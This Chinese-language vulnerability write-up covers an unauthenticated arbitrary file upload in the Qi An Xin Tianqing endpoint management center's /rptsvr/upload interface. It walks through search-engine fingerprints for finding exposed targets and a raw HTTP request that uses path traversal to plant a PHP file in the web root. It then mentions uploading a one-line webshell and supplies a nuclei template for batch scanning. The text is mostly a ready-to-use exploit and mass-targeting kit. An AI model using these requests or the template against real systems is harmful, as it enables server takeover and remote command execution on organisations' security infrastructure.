**漏洞简介**

奇安信 天擎管理中心 rptsvr接口存在任意文件上传漏洞，可上传恶意文件至服务器，执行脚本文件可远程命令执行，造成服务器失陷。

**漏洞复现**

步骤一：使用以下搜索语法获取测试资产并确定测试目标~~~

```
# 搜索语法icon_hash="-829652342"banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index
```

步骤二：抓取首页数据包并修改数据包如下后进行文件上传测试...根据返回的正文可得之已成功上传！！！

```
步骤二：抓取首页数据包并修改数据包如下后进行文件上传测试...根据返回的正文可得之已成功上传！！！

POST /rptsvr/upload HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (MacintoshT2lkQm95Rw==; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data;boundary=---------------------------55433477442814818502792421460
Upgrade-Insecure-Requests: 1
 
-----------------------------55433477442814818502792421460
Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/a.php"
Content-Type: text/x-python
 
<?php phpinfo();?>
-----------------------------55433477442814818502792421460
Content-Disposition: form-data; name="token"
 
skylar_report
-----------------------------55433477442814818502792421460
```

步骤三：访问上传文件地址..可查看到指定的phpinfo()函数内容

```
# 访问地址http://127.0.0.1/application/api/controllers/a.php
```

步骤四：尝试上传一句话木马并测试...

**批量脚本**

```YAML
id: qax-tq-rptsvr-fileupload

info:
  name: qax-tq-rptsvr-fileupload
  author: kali
  severity: critical
  description: 奇安信天擎终端安全管理系统V6.7.0.4130前台文件上传漏洞(XVE-2023-24876)

requests:
  - raw:
      - |
        POST /rptsvr/upload HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data;boundary=---------------------------55433477442814818502792421460
        Upgrade-Insecure-Requests: 1

        -----------------------------55433477442814818502792421460
        Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/TController.php"
        Content-Type: text/x-python

        {{randstr}}
        -----------------------------55433477442814818502792421460
        Content-Disposition: form-data; name="token"

        skylar_report
        -----------------------------55433477442814818502792421460

      - |
        GET /application/api/controllers/TController.php HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "contains_all(body_2, '{{randstr}}') && status_code_2==200"
```

